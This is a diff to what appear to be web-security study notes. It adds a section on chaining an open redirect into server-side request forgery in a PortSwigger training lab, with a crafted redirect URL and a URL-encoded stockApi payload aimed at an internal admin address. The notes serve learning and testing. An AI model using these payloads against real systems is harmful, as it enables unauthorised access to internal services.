@@ -1213,9 +1213,27 @@ pdf creator: wkhtmltopdf 0.12.5
 hacktricks xss cross site scripting server side xss dynamic pdf 
 ```  
 
->SSRF Section incomplete ...need more input...  
+### SSRF Open Redirection  
 
+>The target make **GET** request to the next product on the ecommerce site, using a **path** parameter. On the stockAPI POPST request the value provided in body data is the partial path to interal system. The identification of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  
 
+![SSRF Open Redirect Location reflect](images/ssrf-open-edirect-location-reflect.png)  
+
+```
+https://0ae8000a032748ebc12e083600260006.web-security-academy.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
+```  
+
+>Replace the StockAPI value with the partial path not the absolute URL from above GET request.  
+
+```
+stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
+```  
+
+![SSRF Open Rerdirect](ssrf-open-rerdirect.png)  
+
+[PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
+  
+  
 ## SSTI - Server Side Template Injection
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  
